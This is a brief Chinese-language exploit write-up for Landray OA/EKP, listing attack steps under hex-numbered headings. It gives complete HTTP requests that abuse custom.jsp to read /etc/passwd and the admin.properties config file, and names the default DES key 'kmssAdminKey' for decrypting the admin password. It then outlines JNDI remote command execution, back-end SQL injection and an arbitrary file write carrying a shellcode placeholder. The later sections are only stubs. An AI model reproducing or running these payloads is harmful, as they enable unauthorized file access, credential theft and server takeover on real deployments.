## 0x01-任意文件读取

   访问/sys/ui/extend/varkind/custom.jsp

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: host:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 27
Connection: close
Cookie: JSESSIONID=03699CE5FC0E4D545368FF23E5B32BAF

var={"body":{"file":"file:///etc/passwd"}}
```

配合任意文件读取漏洞获取敏感信息，读取配置文件得到密钥后访问 admin.do 可利用 JNDI远程命令执行获取权限。

## 0x02 SSRF+jndi

   利用任意文件读取/WEB-INF/KmssConfig/admin.properties配置文件
```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: host:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 27
Connection: close
Cookie: JSESSIONID=03699CE5FC0E4D545368FF23E5B32BAF

var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
```
由此获得加密的password,蓝凌OA默认为DES加密，且有个默认密钥为 kmssAdminKey，可以拿着password在在线网站上尝试解密
地址  http://tool.chacuo.net/cryptdes/

![图片](https://user-images.githubusercontent.com/118274389/223748827-8fd0d2b2-6ca3-4083-92d2-6a815e25fa21.png)

## 0x03-EKP后台SQL注入

后台地址admin.do

## 0x04-任意文件写入漏洞1

```var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=[shellcode]```

